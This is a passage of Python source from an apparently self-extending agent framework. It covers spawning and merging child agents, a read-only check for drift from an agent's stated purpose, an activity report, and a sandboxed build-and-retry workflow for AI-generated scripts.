                        lambda m: 'AGENT_PURPOSE = ' + repr(purpose),
                        agent_src, count=1, flags=re.MULTILINE)
    # Point the child agent's GLOBAL_LESSONS_FILE back at the root
    # agent's, so lessons learned by any agent are visible to all
    # (see "FEATURE 3: Cross-agent lesson sharing" near LESSONS_FILE).
    # Same regex fix applies here — a grandchild spawn needs to match the
    # already-injected absolute-path line, not just the workpath() stub.
    root_global_lessons = os.path.abspath(GLOBAL_LESSONS_FILE)
    agent_src = re.sub(r'^GLOBAL_LESSONS_FILE = .*$',
                        lambda m: 'GLOBAL_LESSONS_FILE = ' + repr(root_global_lessons),
                        agent_src, count=1, flags=re.MULTILINE)
    # WORKDIR stays "" — the bootstrap os.chdir() above handles isolation

    write_file(agent_script, "".join(header_lines) + agent_src)

    # Write a README
    seed_ideas = ", ".join(t["idea"] for t in seed_index) if seed_index else "(none)"
    write_file(
        os.path.join(workspace, "README.md"),
        "# " + agent_name + "\n\n"
        "**Purpose:** " + purpose + "\n\n"
        "**Seed tools:** " + seed_ideas + "\n\n"
        "**Run:** `python3 agent.py`\n\n"
        "Full engine included: dreamer, chainer, tool builder, memory, lessons.\n"
        "Will grow its own tool library focused on: " + purpose + "\n"
    )

    return workspace, agent_script

def _check_spawn_redundancy(steps_summary, existing_agents):
    """
    Compares a candidate new agent's chain summary against existing agents'
    stated purposes. Catches near-duplicate spawns that the exact chain_key
    match misses (e.g. same intent, one tool swapped). Returns the matching
    agent dict if a close match is found, else None.
    """
    if not existing_agents:
        return None
    agents_summary = "\n".join(
        a["id"] + " (" + a["name"] + "): " + a["purpose"] for a in existing_agents
    )
    prompt = (
        "A new tool chain is about to become a specialised agent.\n"
        "New chain's combined task: " + steps_summary + "\n\n"
        "Existing agents already spawned:\n" + agents_summary + "\n\n"
        "Does the new chain's purpose substantially overlap with any existing "
        "agent's purpose (same domain/goal, even if different exact tools)? "
        "Reply in this exact format:\n"
        "MATCH: <agent_id or NONE>\n"
        "REASON: <one sentence>"
    )
    response = ask_ai(prompt).strip()
    match = re.search(r"MATCH:\s*(\S+)", response)
    matched_id = match.group(1) if match else "NONE"
    if matched_id == "NONE":
        return None
    for a in existing_agents:
        if a["id"] == matched_id:
            return a
    return None

def spawn_agent_from_chain(tool_ids, chain_steps):
    """
    Crystallizes a proven tool chain into a new full agent workspace.
    tool_ids = ordered list of tool ids in the chain
    chain_steps = [{"tool_id", "idea", "filepath", "instruction"}, ...]
    Returns agent_id or None if failed.
    """
    existing_agents = load_agents_index()

    # Don't respawn the exact same chain
    chain_key = "->".join(tool_ids)
    for a in existing_agents:
        if a.get("chain_key") == chain_key:
            return None

    # Semantic redundancy check — catches near-duplicate chains that the
    # exact chain_key match above misses (same intent, different tool mix)
    steps_summary = " + ".join(s["idea"][:30] for s in chain_steps)
    redundant_match = _check_spawn_redundancy(steps_summary, existing_agents)
    if redundant_match:
        print("\n=== Possible Duplicate Agent ===")
        print("New chain: " + steps_summary)
        print("Looks similar to existing agent: " + redundant_match["id"] +
              " (" + redundant_match["name"] + ") - " + redundant_match["purpose"])
        try:
            choice = input("Spawn anyway as a new agent? (yes/no): ").strip().lower()
        except EOFError:
            # No interactive stdin (background/dreamer/scheduled context) —
            # fail safe by treating it as covered rather than hanging or crashing.
            choice = "no"
        if choice != "yes":
            print("Skipped spawning — treating as covered by " + redundant_match["id"] + ".\n")
            return None

    # Ask AI to name and describe this agent
    naming_prompt = """These tools are chained together: """ + steps_summary + """

Give this combined agent:
1. A short snake_case name (e.g. weather_briefing_agent)
2. A one-sentence purpose

Reply in this format:
NAME: <name>
PURPOSE: <purpose>"""
    naming = ask_ai(naming_prompt).strip()
    name_match = re.search(r"NAME:\s*(\S+)", naming)
    purpose_match = re.search(r"PURPOSE:\s*(.+)", naming)
    agent_name = name_match.group(1) if name_match else _next_agent_id(existing_agents)
    purpose = purpose_match.group(1).strip() if purpose_match else steps_summary

    agent_id = _next_agent_id(existing_agents)

    print("\n=== Spawning New Agent ===")
    print("ID:      " + agent_id)
    print("Name:    " + agent_name)
    print("Purpose: " + purpose)
    print("Chain:   " + " -> ".join(tool_ids))

    workspace, agent_script = build_agent_workspace(
        agent_name, purpose, agent_id, tool_ids, chain_steps
    )
    if not workspace:
        print("Could not build agent workspace.")
        return None

    # Validate the agent script compiles
    check = subprocess.run(
        ["python3", "-m", "py_compile", agent_script],
        capture_output=True, text=True, timeout=15
    )
    if check.returncode != 0:
        print("Agent syntax error:\n" + check.stderr[:400])
        shutil.rmtree(workspace, ignore_errors=True)
        return None

    # Register in parent's agents index. Re-load fresh under the lock rather
    # than reusing the `existing_agents` snapshot from the top of this
    # function — everything above (AI naming, workspace build, py_compile)
    # took real time, during which another thread could have spawned or
    # merged agents; saving the old snapshot here would silently erase that.
    with _agents_index_lock:
        current_agents = load_agents_index()
        if any(a.get("chain_key") == chain_key for a in current_agents):
            # Someone else spawned this exact chain while we were building —
            # don't register a duplicate; clean up the workspace we built.
            shutil.rmtree(workspace, ignore_errors=True)
            return None
        current_agents.append({
            "id": agent_id,
            "name": agent_name,
            "purpose": purpose,
            "workspace": workspace,
            "filepath": agent_script,
            "chain_key": chain_key,
            "tool_ids": tool_ids,
            "spawned_at": time.time(),
            "runs": 0
        })
        save_agents_index(current_agents)
    print("Workspace: " + workspace)
    print("Run with:  python3 " + agent_script)
    print("==========================\n")
    return agent_id


def maybe_spawn_agent_from_chain(tool_ids, chain_steps):
    """Called after every successful chain run. Spawns agent if threshold reached."""
    count = record_chain_success(tool_ids)
    print("  [chainer] chain " + "->".join(tool_ids) + " success #" + str(count))
    if count >= CHAIN_SPAWN_THRESHOLD:
        spawn_agent_from_chain(tool_ids, chain_steps)
        # After a new agent joins the pool, check whether it (or anyone
        # else) now overlaps enough with another agent to fold together.
        auto_merge_check()

# ============================================================
# AGENT BEHAVIOR DRIFT DETECTOR
# Checks whether a spawned agent's recent tool-building activity still
# matches the purpose it was given at spawn time. Read-only — flags
# drift, never disables or modifies the agent itself.
# ============================================================

def _load_agent_recent_tools(agent, max_items=8):
    """Reads a spawned agent's own tools_index.json from its workspace,
    returns the most recently added entries (tail of the list)."""
    child_index_path = os.path.join(agent.get("workspace", ""), "tools_index.json")
    if not os.path.exists(child_index_path):
        return []
    try:
        child_index = json.loads(read_file(child_index_path))
    except Exception:
        return []
    return child_index[-max_items:]

def check_agent_drift(agent):
    """
    Compares one spawned agent's recent tools against its stated purpose.
    Returns dict: {drifted: bool, reason: str, checked_count: int}
    """
    recent_tools = _load_agent_recent_tools(agent)
    if len(recent_tools) < 2:
        return {"drifted": False, "reason": "Not enough activity yet to judge.", "checked_count": len(recent_tools)}

    tools_summary = "\n".join(
        "- " + t.get("idea", "(no description)") for t in recent_tools
    )
    prompt = (
        "An agent named '" + agent["name"] + "' was created with this purpose:\n" +
        agent["purpose"] + "\n\n"
        "Here are the tools it has built most recently:\n" + tools_summary + "\n\n"
        "Does this recent activity still clearly serve the stated purpose, or has "
        "it drifted into unrelated territory? Reply in this exact format:\n"
        "DRIFTED: <YES or NO>\n"
        "REASON: <one or two sentences>"
    )
    response = ask_ai(prompt).strip()
    drifted_match = re.search(r"DRIFTED:\s*(YES|NO)", response, re.IGNORECASE)
    reason_match = re.search(r"REASON:\s*(.+)", response, re.DOTALL)
    drifted = bool(drifted_match and drifted_match.group(1).upper() == "YES")
    reason = reason_match.group(1).strip() if reason_match else "(no reason given)"
    return {"drifted": drifted, "reason": reason, "checked_count": len(recent_tools)}

def run_drift_check(target_id=None):
    """
    Checks one agent (if target_id given) or all spawned agents for
    behavior drift against their stated purpose. Prints a report.
    This is read-only — never modifies, pauses, or retires an agent.
    """
    agents = load_agents_index()
    if not agents:
        print("No agents spawned yet.")
        return

    if target_id:
        agents = [a for a in agents if a["id"] == target_id or a["name"] == target_id]
        if not agents:
            print("Agent not found: " + target_id)
            return

    print("\n=== Drift Check ===")
    for agent in agents:
        result = check_agent_drift(agent)
        status = "DRIFTED" if result["drifted"] else "on-purpose"
        print(agent["id"] + " [" + agent["name"] + "] - " + status +
              " (checked " + str(result["checked_count"]) + " recent tools)")
        print("  Purpose: " + agent["purpose"])
        print("  " + result["reason"])
        print()
    print("====================\n")

# ============================================================
# AGENT MERGING
# Spawning splits work into specialists. This is the inverse: when two
# or more spawned agents have grown to cover overlapping ground, fold
# them into one consolidated agent instead of letting them sprawl.
# Trust handling: new agent's starting trust is a runs-weighted average
# of its parents' tool trust, then it spends MERGE_PROBATION_RUNS runs
# in "probation" (tighter drift sensitivity) before being treated as a
# normal agent. A merge is a new entity behaviorally, even though its
# parts are proven, so it has to re-earn full standing.
# ============================================================

MERGE_PROBATION_RUNS = 15
MERGED_LOG_FILE = workpath("agent_merges.json")
AGENT_OVERLAP_THRESHOLD = 0.5  # jaccard similarity of tool_ids to consider a merge

def load_merge_log():
    return read_json_file(MERGED_LOG_FILE, [])

def save_merge_log(log):
    write_file(MERGED_LOG_FILE, json.dumps(log, indent=2))

def _agent_trust_score(agent):
    """Weighted-average trust for an agent, derived from the good/bad run
    counts of the tools it was built from. Returns (score 0-1, weight)."""
    index = {t["id"]: t for t in load_tools_index()}
    good_total, bad_total = 0, 0
    for tid in agent.get("tool_ids", []):
        t = index.get(tid)
        if not t:
            continue
        good_total += t.get("good_runs", 0)
        bad_total += t.get("bad_runs", 0)
    total = good_total + bad_total
    if total == 0:
        return 0.75, 0  # no signal yet — neutral-optimistic default, zero weight
    return good_total / total, total

def _agent_tool_set(agent):
    return set(agent.get("tool_ids", []))

def _jaccard(a, b):
    if not a and not b:
        return 0.0
    inter = len(a & b)
    union = len(a | b)
    return inter / union if union else 0.0

def merge_agents(agent_ids, new_name=None):
    """
    Merges 2+ spawned agents into a single consolidated agent.
    - Unions their tool_ids (deduped)
    - Merges each agent's local agent_lessons.txt into the new one, deduping
    - Computes a runs-weighted-average trust score across parents
    - Marks the merged agent as on probation for MERGE_PROBATION_RUNS runs
    - Retires the parent agents from the active index (workspace kept on disk)
    Returns the new agent_id, or None if it couldn't merge.
    """
    agents = load_agents_index()
    targets = [a for a in agents if a["id"] in agent_ids or a["name"] in agent_ids]
    if len(targets) < 2:
        print("Need at least 2 valid agents to merge. Got: " + str(len(targets)))
        return None

    merged_tool_ids = []
    for a in targets:
        for tid in a.get("tool_ids", []):
            if tid not in merged_tool_ids:
                merged_tool_ids.append(tid)

    weighted_sum, weight_total = 0.0, 0
    for a in targets:
        score, weight = _agent_trust_score(a)
        weighted_sum += score * max(weight, 1)  # floor weight at 1 so zero-data agents still count a little
        weight_total += max(weight, 1)
    new_trust = round(weighted_sum / weight_total, 3) if weight_total else 0.75

    merged_lessons = []
    seen_lower = set()
    for a in targets:
        child_lessons_path = os.path.join(a.get("workspace", ""), "agent_lessons.txt")
        if os.path.exists(child_lessons_path):
            for line in read_file(child_lessons_path).split("\n"):
                line = line.strip()
                key = line.lower().strip("- ")
                if line and key not in seen_lower:
                    merged_lessons.append(line)
                    seen_lower.add(key)

    purposes = "; ".join(a["purpose"] for a in targets)
    if new_name:
        agent_name = new_name
    else:
        naming_prompt = (
            "These specialised agents are being merged into one:\n" + purposes +
            "\n\nGive the merged agent a short snake_case name. Reply with ONLY the name."
        )
        name_reply = ask_ai(naming_prompt).strip()
        agent_name = name_reply.split()[0] if name_reply else "merged_agent_" + str(len(agents) + 1)

    purpose_prompt = (
        "These agents are being merged into one combined agent:\n" + purposes +
        "\n\nWrite a single one-sentence purpose that covers all of them. Reply with ONLY the sentence."
    )
    merged_purpose = ask_ai(purpose_prompt).strip() or purposes

    agent_id = _next_agent_id(agents)
    chain_steps = []
    for a in targets:
        for tid in a.get("tool_ids", []):
            chain_steps.append({"tool_id": tid, "idea": tid, "filepath": ""})

    print("\n=== Merging Agents ===")
    print("Merging: " + ", ".join(a["id"] + " (" + a["name"] + ")" for a in targets))
    print("Into:    " + agent_id + " [" + agent_name + "]")
    print("Tools combined: " + str(len(merged_tool_ids)))
    print("Starting trust: " + str(new_trust) + " (probationary for " + str(MERGE_PROBATION_RUNS) + " runs)")

    workspace, agent_script = build_agent_workspace(
        agent_name, merged_purpose, agent_id, merged_tool_ids, chain_steps
    )
    if not workspace:
        print("Could not build merged agent workspace.")
        return None

    if merged_lessons:
        write_file(os.path.join(workspace, "agent_lessons.txt"), "\n".join(merged_lessons))

    check = subprocess.run(
        ["python3", "-m", "py_compile", agent_script],
        capture_output=True, text=True, timeout=15
    )
    if check.returncode != 0:
        print("Merged agent syntax error:\n" + check.stderr[:400])
        shutil.rmtree(workspace, ignore_errors=True)
        return None

    parent_ids = [a["id"] for a in targets]
    # Re-load fresh under the lock instead of reusing the `agents` snapshot
    # from the top of this function — the AI naming calls, workspace build,
    # and py_compile check above all took real time, during which another
    # thread could have spawned or merged agents; saving the stale snapshot
    # would silently undo that work.
    with _agents_index_lock:
        current_agents = load_agents_index()
        current_agents = [a for a in current_agents if a["id"] not in parent_ids]  # retire parents from active index
        current_agents.append({
            "id": agent_id,
            "name": agent_name,
            "purpose": merged_purpose,
            "workspace": workspace,
            "filepath": agent_script,
            "chain_key": "merged:" + "+".join(parent_ids),
            "tool_ids": merged_tool_ids,
            "spawned_at": time.time(),
            "runs": 0,
            "trust_score": new_trust,
            "probation_runs_left": MERGE_PROBATION_RUNS,
            "merged_from": parent_ids,
        })
        save_agents_index(current_agents)

    merge_log = load_merge_log()
    merge_log.append({
        "timestamp": time.time(),
        "new_agent_id": agent_id,
        "new_agent_name": agent_name,
        "merged_from": parent_ids,
        "starting_trust": new_trust,
    })
    save_merge_log(merge_log)

    print("Merged agent ready: " + agent_id + " — " + merged_purpose)
    print("=======================\n")
    return agent_id

def _agents_overlap_pairs(agents, threshold=AGENT_OVERLAP_THRESHOLD):
    """Returns (agent_a, agent_b, similarity) for pairs whose tool sets
    overlap above threshold. Skips agents currently on probation so a
    fresh merge isn't immediately re-merged."""
    pairs = []
    for i, a in enumerate(agents):
        if a.get("probation_runs_left", 0) > 0:
            continue
        for b in agents[i + 1:]:
            if b.get("probation_runs_left", 0) > 0:
                continue
            sim = _jaccard(_agent_tool_set(a), _agent_tool_set(b))
            if sim >= threshold:
                pairs.append((a, b, sim))
    return pairs

def auto_merge_check(silent=False):
    """
    Looks for spawned agents whose tool sets overlap heavily, confirms
    with the AI that their purposes genuinely overlap (not just an
    incidental shared tool), and merges them automatically — no prompt.
    Runs after every successful spawn and is also exposed as 'mergecheck'.
    Returns the list of new merged agent_ids created this pass.
    """
    agents = load_agents_index()
    if len(agents) < 2:
        return []
    pairs = _agents_overlap_pairs(agents)
    merged_ids = []
    already_merged_this_pass = set()
    for a, b, sim in pairs:
        if a["id"] in already_merged_this_pass or b["id"] in already_merged_this_pass:
            continue
        confirm_prompt = (
            "Agent A purpose: " + a["purpose"] + "\n"
            "Agent B purpose: " + b["purpose"] + "\n"
            "Their tool sets overlap " + str(round(sim * 100)) + "%.\n"
            "Should these genuinely be ONE consolidated agent (same real-world job), "
            "or do they just happen to share a tool while serving different goals? "
            "Reply in this exact format:\nMERGE: <YES or NO>\nREASON: <one sentence>"
        )
        response = ask_ai(confirm_prompt).strip()
        should_merge = bool(re.search(r"MERGE:\s*YES", response, re.IGNORECASE))
        if not should_merge:
            continue
        if not silent:
            print("[automerge] " + a["id"] + " + " + b["id"] + " overlap " +
                  str(round(sim * 100)) + "% — merging.")
        new_id = merge_agents([a["id"], b["id"]])
        if new_id:
            merged_ids.append(new_id)
            already_merged_this_pass.add(a["id"])
            already_merged_this_pass.add(b["id"])
    return merged_ids

def tick_agent_probation(agent_id):
    """Call after an agent finishes a run. Counts down probation and,
    once it reaches 0, the agent graduates to normal trust handling."""
    # BUG FIX: this used to load/modify/save agents_index.json without
    # _agents_index_lock — the exact same lost-update race documented above
    # for tools_index.json, just missed here. Called from inside the
    # ThreadPoolExecutor worker path (see spawn_agent_from_chain /
    # merge_agents), so a concurrent spawn or merge running in another
    # thread could load a snapshot, this function saves its own snapshot on
    # top, and the other thread's write is silently discarded. Wrapping the
    # whole read-modify-write in the lock, like every other write site in
    # this file, makes it atomic with respect to those other writers.
    with _agents_index_lock:
        agents = load_agents_index()
        for a in agents:
            if a["id"] == agent_id and a.get("probation_runs_left", 0) > 0:
                a["probation_runs_left"] -= 1
                if a["probation_runs_left"] == 0:
                    print("[probation] " + agent_id + " [" + a["name"] + "] graduated to full trust.")
        save_agents_index(agents)

# ============================================================
# PLAIN-ENGLISH ACTIVITY LOG ("whathappened")
# Pulls from every tracking file the agent already keeps and renders a
# single human-readable summary instead of raw JSON — what got built,
# what got spawned/merged, what was learned, what failed, what it cost.
# ============================================================

def build_activity_report(limit=8):
    """
    Builds the plain-language "what has been happening" summary as a
    string — tools, agents, merges, decisions, lessons, AI usage cost.
    Read-only — never modifies state. Factored out of whathappened() so
    the same content can be emailed, not just printed to console.
    """
    lines = ["========== WHAT HAS BEEN HAPPENING ==========", ""]

    tools = load_tools_index()
    if tools:
        good = sum(t.get("good_runs", 0) for t in tools)
        bad = sum(t.get("bad_runs", 0) for t in tools)
        lines.append(str(len(tools)) + " tool(s) built so far. " +
                      str(good) + " successful runs, " + str(bad) + " failed runs overall.")
        lines.append("Most recently built:")
        for t in tools[-limit:]:
            trust = "no runs yet" if (t.get("good_runs", 0) + t.get("bad_runs", 0)) == 0 \
                else str(t.get("good_runs", 0)) + " good / " + str(t.get("bad_runs", 0)) + " bad"
            lines.append("  - " + t["id"] + ": " + t.get("idea", "(no description)") + " (" + trust + ")")
    else:
        lines.append("No tools built yet.")
    lines.append("")

    agents = load_agents_index()
    if agents:
        lines.append(str(len(agents)) + " agent(s) currently active:")
        for a in agents:
            status = ""
            if a.get("probation_runs_left", 0) > 0:
                status = " [probation: " + str(a["probation_runs_left"]) + " runs left]"
            elif "trust_score" in a:
                status = " [trust: " + str(a["trust_score"]) + "]"
            merged_note = " — formed by merging " + ", ".join(a["merged_from"]) if a.get("merged_from") else ""
            lines.append("  - " + a["id"] + " (" + a["name"] + "): " + a["purpose"] + status + merged_note)
    else:
        lines.append("No agents spawned yet.")
    lines.append("")

    merges = load_merge_log()
    if merges:
        lines.append(str(len(merges)) + " merge(s) have happened. Most recent:")
        for m in merges[-limit:]:
            when = time.strftime("%Y-%m-%d %H:%M", time.localtime(m["timestamp"]))
            lines.append("  - " + when + ": " + ", ".join(m["merged_from"]) +
                          " became " + m["new_agent_id"] + " (" + m["new_agent_name"] + ")")
    else:
        lines.append("No agents have been merged yet.")
    lines.append("")

    decisions = load_decisions_log()
    if decisions:
        lines.append("Recent decisions made:")
        for d in decisions[-limit:]:
            when = time.strftime("%Y-%m-%d %H:%M", time.localtime(d["timestamp"]))
            lines.append("  - " + when + ": chose \"" + str(d["chosen"]) + "\" for a " +
                          d["kind"] + " decision" + (" — " + d["reason"] if d.get("reason") else ""))
        lines.append("")

    lessons_text = load_lessons()
    if lessons_text:
        lesson_lines = [l for l in lessons_text.split("\n") if l.strip()]
        lines.append(str(len(lesson_lines)) + " lesson(s) learned. Most recent:")
        for l in lesson_lines[-limit:]:
            lines.append("  " + l)
    else:
        lines.append("No lessons learned yet.")
    lines.append("")

    usage = load_usage_log()
    if usage:
        total_prompt = sum(u.get("prompt_tokens", 0) for u in usage)
        total_completion = sum(u.get("completion_tokens", 0) for u in usage)
        lines.append(str(len(usage)) + " AI call(s) logged. " +
                      str(total_prompt) + " prompt tokens, " + str(total_completion) + " completion tokens used in total.")

    schedules = load_schedules()
    if schedules:
        lines.append("")
        lines.append(str(len(schedules)) + " tool(s) on a recurring schedule:")
        for s in schedules:
            last = "never" if not s.get("last_run") else time.strftime("%Y-%m-%d %H:%M", time.localtime(s["last_run"]))
            lines.append("  - " + s["tool_id"] + ": every " + str(s["interval_minutes"]) +
                          " min, ran " + str(s.get("runs", 0)) + " time(s) so far, last run " + last)

    backups = list_backups()
    lines.append("")
    lines.append(str(len(backups)) + " self-upgrade backup(s) on file" +
                  (" (most recent kept as a safety net for rollback)." if backups else " — no self-upgrade has happened yet."))

    lines.append("")
    lines.append("================================================")
    return "\n".join(lines)

def whathappened(limit=8):
    """Console-printing wrapper around build_activity_report() — kept so the
    existing 'whathappened'/'log'/'activity' command behaves exactly as before."""
    print("\n" + build_activity_report(limit) + "\n")

# ============================================================
# LOCAL BUILD WORKFLOW (build:)
# ============================================================

GENERATED_CODE_FILE = workpath("generated_script.py")
MAX_CODE_ATTEMPTS = 3
CODE_TIMEOUT_SECONDS = 30
# BUG FIX: GENERATED_CODE_FILE is a single shared scratch path, but it's
# written and re-read across multi-step, sometimes multi-second workflows
# (build_and_fix_workflow's retry loop, draft_idea_silently, and
# red_team_and_fix_one_tool) that can all run concurrently — build_and_fix_workflow
# via run_goal_with_dependencies()'s ThreadPoolExecutor for independent goal
# steps, and draft_idea_silently/red_team_and_fix_one_tool from the dreamer
# thread while the main/worker threads are simultaneously mid-build. Without
# serializing access, one caller's write_code()/write_file() can silently
# overwrite another's in-flight script between its write and its later
# read/run/register — the wrong code gets executed, security-checked, and
# registered under the wrong idea's tool id. This mirrors the tools_index.json
# / agents_index.json lost-update races fixed elsewhere, but for the actual
# file GENERATED_CODE_FILE rather than a JSON index.
_generated_code_file_lock = threading.Lock()

def parse_flags(text):
    text = text.strip()
    force = False
    rival = False
    while text.endswith("!!") or text.endswith("??"):
        if text.endswith("!!"):
            force = True
            text = text[:-2].strip()
        elif text.endswith("??"):
            rival = True
            text = text[:-2].strip()
    return text, force, rival

def write_code(idea, previous_error="", injected_url=None, injected_key=None):
    lessons = load_lessons()
    lessons_block = ("\n\nLessons learned from past failures:\n" + lessons) if lessons else ""

    injection_block = ""
    if injected_url:
        injection_block += "\nIMPORTANT: Use this exact API endpoint (no key needed): " + injected_url
    if injected_key:
        injection_block += "\nIMPORTANT: Use this API key that was auto-retrieved: " + injected_key

    if previous_error:
        prompt = """Write a complete, standalone Python script for this idea: """ + idea + """

Previous attempt failed:
""" + previous_error + injection_block + """

Fix the code. Reply with ONLY the Python code, no markdown fences."""
    else:
        prompt = """Write a complete, standalone Python script for this idea: """ + idea + """

Use only Python built-in libraries. Keep it simple and safe.""" + injection_block + lessons_block + """
Reply with ONLY the Python code, no markdown fences."""
    raw = ask_ai(prompt)
    if raw.startswith("ERROR:"):
        # The AI call itself failed (rate limit, no keys, network, etc.) —
        # don't write that error text to disk as if it were code; it would
        # just fail the security scan with a confusing "invalid syntax"
        # message and burn a retry attempt for no reason.
        write_file(GENERATED_CODE_FILE, "# (no code generated — AI call failed)\n")
        return raw
    code = strip_fences(raw)
    write_file(GENERATED_CODE_FILE, code)
    return code

def _run_rival_candidate(filepath, code):
    """
    Runs one rival candidate through the SAME safety gate as every other
    generated tool: AST security scan first, then run_sandboxed_python()
    (secrets stripped from env, cwd scoped to the script's own folder,
    resource-limited). Previously build_with_rivals() ran rival_simple.py
    / rival_robust.py with a bare subprocess.run() — no security check at
    all, and the child process inherited the FULL parent environment
    (CEREBRAS_API_KEY, GITHUB_TOKEN, email app password, etc.) with no
    cwd restriction, meaning either AI-generated candidate could read
    secrets or project files the normal build path is specifically
    designed to keep generated code away from. Returns (success, output).
    """
    sec_passed, sec_reason = check_security(code)
    if not sec_passed:
        return False, "Blocked before running by security scan (AST): " + sec_reason
    return run_sandboxed_python(filepath, timeout=CODE_TIMEOUT_SECONDS)

def build_with_rivals(idea):
    simple_code = strip_fences(ask_ai("Write the SIMPLEST possible Python script for: " + idea + ". Built-ins only. Reply with ONLY code."))
    robust_code = strip_fences(ask_ai("Write a ROBUST Python script for: " + idea + ". Handle edge cases. Built-ins only. Reply with ONLY code."))
    write_file(workpath("rival_simple.py"), simple_code)
    write_file(workpath("rival_robust.py"), robust_code)
    ok_a, out_a = _run_rival_candidate(workpath("rival_simple.py"), simple_code)
    ok_b, out_b = _run_rival_candidate(workpath("rival_robust.py"), robust_code)
    out_a = out_a if ok_a else "FAILED"
    out_b = out_b if ok_b else "FAILED"
    if out_a == "FAILED" and out_b == "FAILED":
        chosen_code = simple_code
    else:
        winner = ask_ai("Solution A: " + out_a + "\nSolution B: " + out_b + "\nWhich is better? Reply ONLY: A or B").strip().upper()
        chosen_code = simple_code if winner == "A" else robust_code
    write_file(GENERATED_CODE_FILE, chosen_code)
    return chosen_code

def run_generated_code():
    code_text = read_file(GENERATED_CODE_FILE)

    sec_passed, sec_reason = check_security(code_text)
    if not sec_passed:
        reason = "Blocked before running by security scan (AST): " + sec_reason
        print(reason)
        return False, reason

    blocked, warnings = run_all_prechecks(code_text)
    if blocked:
        reason = "Blocked before running by learned precheck(s): " + "; ".join(warnings)
        print(reason)
        return False, reason
    if warnings:
        print("Pre-check warnings: " + "; ".join(warnings))
    return run_sandboxed_python(GENERATED_CODE_FILE, timeout=CODE_TIMEOUT_SECONDS)

def build_and_fix_workflow(idea_raw):
    idea, force, rival = parse_flags(idea_raw)

    if is_web_idea(idea):
        return build_and_fix_web_workflow(idea_raw)

    if is_video_idea(idea):
        return build_and_fix_video_workflow(idea_raw)

    if is_unity_idea(idea):
        return build_and_fix_unity_workflow(idea_raw)

    if not force:
        existing = find_matching_tool(idea)
        if existing:
            print("Found existing tool: " + existing["id"] + " — reusing it.")
            success, output = run_existing_tool(existing)
            if success:
                print(output)
                return "Reused existing tool (" + existing["id"] + "). Output:\n" + output
            print("Existing tool failed, rebuilding...")
    else:
        print("Force flag — skipping reuse check.")

    # BUG FIX: everything from here on reads/writes the shared
    # GENERATED_CODE_FILE — hold _generated_code_file_lock for the whole
    # build+retry cycle so a concurrent step (or the dreamer thread) can't
    # interleave its own write_code()/write_file() into the middle of this
    # one. See the lock's definition above for the full race description.
    with _generated_code_file_lock:
        print("Building code for: " + idea)
        if rival:
            code = build_with_rivals(idea)
        else:
            code = write_code(idea)

        if code.startswith("ERROR:"):
            return "Could not build — the AI call itself failed before any code was written: " + code

        injected_url = None
        injected_key = None

        for attempt in range(1, MAX_CODE_ATTEMPTS + 1):
            print("--- Attempt " + str(attempt) + " ---")
            success, output = run_generated_code()
            if success:
                print("Success! Output:\n" + output)
                tool_id = register_tool(idea, read_file(GENERATED_CODE_FILE))
                return "Built successfully after " + str(attempt) + " attempt(s). Saved as " + tool_id + "."
            else:
                print("Failed:\n" + output)
                if is_api_key_error(output):
                    print("Detected API key issue — attempting auto-resolution...")
                    new_url, new_key, fallback_msg = handle_api_key_error(output, idea)
                    if fallback_msg:
                        return fallback_msg
                    if new_url:
                        injected_url = new_url
                    if new_key:
                        injected_key = new_key
                category = categorize_failure(output)
                lesson = reflect_on_failure(idea, output)
                maybe_create_precheck(category, lesson or "")
                if attempt < MAX_CODE_ATTEMPTS:
                    print("Asking AI to fix...")
                    code = write_code(idea, previous_error=output, injected_url=injected_url, injected_key=injected_key)
                    if code.startswith("ERROR:"):
                        return "Could not build — the AI call itself failed on retry: " + code
                else:
                    return "Could not build after " + str(MAX_CODE_ATTEMPTS) + " attempts. Last error:\n" + output
        return "Unexpected end of retry loop."

# ============================================================
# WEB BUILD LANE
# ============================================================

WEB_CODE_FILE = workpath("generated_web.html")
MAX_WEB_ATTEMPTS = 3
WEB_REPO_NAME = "agent-web-tools"
PLAYWRIGHT_AVAILABLE = None

def playwright_is_available():
    """
    BUG FIX: this used to call p.chromium.launch() with no executable_path,
    which only looks for Playwright's OWN bundled/downloaded browser — not
    a system-installed one. On Replit (and anywhere using a Nix-provided
    Chromium instead of `playwright install chromium`, which downloads a
    binary that's incompatible with Nix environments), that bundled browser
    was never installed on purpose, so this always failed and reported
    "not available" even when a perfectly working Chromium was sitting
    right there via shutil.which("chromium"). That silently forced every
    caller (check_web_output, check_website_bugs) into their degraded
    fallback paths despite the browser actually being usable. Confirmed via
    a real run: `which chromium` succeeded and pip confirmed Playwright was
    installed, yet check_website_bugs() still reported "Playwright/Chromium
    isn't usable here" — this is why. Now tries the system binary first
    (matching what check_website_bugs() actually launches with) and only
    falls back to Playwright's own default if that's not found.
    """
    global PLAYWRIGHT_AVAILABLE
    if PLAYWRIGHT_AVAILABLE is not None:
        return PLAYWRIGHT_AVAILABLE
    try:
        from playwright.sync_api import sync_playwright
        chromium_path = _find_nix_chromium()
        with sync_playwright() as p:
            browser = p.chromium.launch(
                executable_path=chromium_path,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
            )
            browser.close()
        PLAYWRIGHT_AVAILABLE = True
    except Exception:
        PLAYWRIGHT_AVAILABLE = False
    return PLAYWRIGHT_AVAILABLE

def _idea_wants_3d(idea):
    if idea in _wants_3d_cache:
        return _wants_3d_cache[idea]
    prompt = """Would this website benefit from an interactive 3D/WebGL scene (e.g. a 3D hero, product viewer, particle effects, scroll-driven camera) rather than being purely flat/2D?
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_3d_cache[idea] = result
    return result

def _idea_wants_game(idea):
    """
    Classifies whether this web idea IS a playable game (not just a page
    that mentions games) — used to swap in game_dev_rules instead of the
    generic marketing-site design_rules, and to relax/adjust the
    structural + browser QA checks (games need a real game loop and input
    handling checked, not scroll-reveal animation).
    """
    if idea in _wants_game_cache:
        return _wants_game_cache[idea]
    prompt = """Is this request asking to build an actual PLAYABLE GAME (something with player input, a game loop, win/lose or scoring conditions — e.g. a platformer, puzzle, arcade, shooter, or similar) as opposed to a marketing site, dashboard, or informational page?
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_game_cache[idea] = result
    return result

def _idea_wants_multipage(idea):
    """
    Classifies whether an idea explicitly implies multiple distinct pages
    (e.g. "with an About page and a Contact page", "a 3-page portfolio
    site") rather than a single long scrolling page — the far more common
    default for a small site. Only triggers on real multi-page signals so
    this stays the exception, not the default.
    """
    if idea in _wants_multipage_cache:
